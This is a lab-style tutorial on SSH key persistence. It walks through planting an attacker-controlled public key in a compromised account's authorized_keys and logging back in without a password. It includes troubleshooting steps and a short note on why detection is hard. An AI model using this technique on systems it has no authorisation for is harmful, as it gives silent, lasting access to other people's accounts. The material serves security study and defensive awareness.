# Linux Privilege Escalation & Persistence: SSH Key Exploitation

---

## 1. Core Concept: SSH Key Authentication

SSH (Secure Shell) uses public-key cryptography for authentication instead of passwords.

### Key Pair

**Private Key (`id_rsa`)**
- Stored on the client (attacker machine)
- Must remain secret
- Used to prove identity

**Public Key (`id_rsa.pub`)**
- Placed on target system
- Stored inside `~/.ssh/authorized_keys`
- Used to verify the private key

---

## Authentication Flow

1. Client sends SSH connection request
2. Server checks `authorized_keys`
3. Server challenges client
4. Client proves ownership using private key
5. Access granted if match succeeds

---

## 2. Attack Vector: SSH Key Persistence

Scenario:
- Access already obtained on target system
- Goal is persistent access without password

Method:
- Add attacker-controlled public key to target system
- Login using private key from attacker machine

---

## 3. Exploitation Steps

---

### Step 1: Generate SSH Key Pair (Attacker Machine)

```bash
ssh-keygen -t rsa
```

Default outputs:
- `id_rsa` → private key
- `id_rsa.pub` → public key

No passphrase recommended for automation in labs.

---

### Step 2: Copy Public Key

```bash
cat id_rsa.pub
```

Copy full output.

---

### Step 3: Add Public Key to Target

On target system:

```bash
mkdir -p ~/.ssh
nano ~/.ssh/authorized_keys
```

Paste public key into file.

---

### Step 4: Set Permissions (Critical)

```bash
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys
```

---

### Step 5: Login Using Private Key

On attacker machine:

```bash
ssh -i id_rsa user@TARGET_IP
```

---

## Result

- Direct login without password
- Stable access channel
- Persistence achieved

---

## 4. Common Issues & Fixes

---

### Issue 1: Wrong File Name

#### Problem
SSH prompts for password even after setup.

#### Cause
Incorrect filename:

```
authorized_key ❌
authorized_keys ✅
```

#### Fix

```bash
mv ~/.ssh/authorized_key ~/.ssh/authorized_keys
```

---

### Issue 2: Wrong Key Used

#### Problem
Error:
```
Identity file not accessible
```

#### Cause
Using public key instead of private key in `-i`

#### Fix

```bash
ssh -i id_rsa user@TARGET_IP
```

---

### Issue 3: Algorithm Mismatch

#### Problem
Error:
```
no mutual signature algorithm
```

#### Cause
- Server uses legacy `ssh-rsa`
- New OpenSSH disables SHA-1 signatures

---

#### Fix

```bash
ssh -i id_rsa user@TARGET_IP \
-oHostKeyAlgorithms=+ssh-rsa \
-oPubkeyAcceptedAlgorithms=+ssh-rsa
```

---

## 5. File Permission Requirements

---

### Target System

```bash
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys
```

---

### Attacker System

```bash
chmod 600 id_rsa
```

---

## 6. Internal Working Logic

### SSH Trust Model

- Public key = stored trust anchor
- Private key = identity proof
- Matching pair = authentication success

---

## 7. Persistence Behavior

Once installed:

- Access remains permanent
- Survives reboot
- Survives password changes
- Does not require user interaction

---

## 8. Security Impact

If attacker gains write access to:

```
~/.ssh/authorized_keys
```

Then:

- Full account takeover possible
- Silent persistence established
- Detection is difficult without monitoring

---

## 9. Key Takeaways

- SSH keys replace passwords
- Public key must be correctly placed
- Permissions must be strict
- Private key must remain protected
- Misconfiguration leads to full compromise

---
```
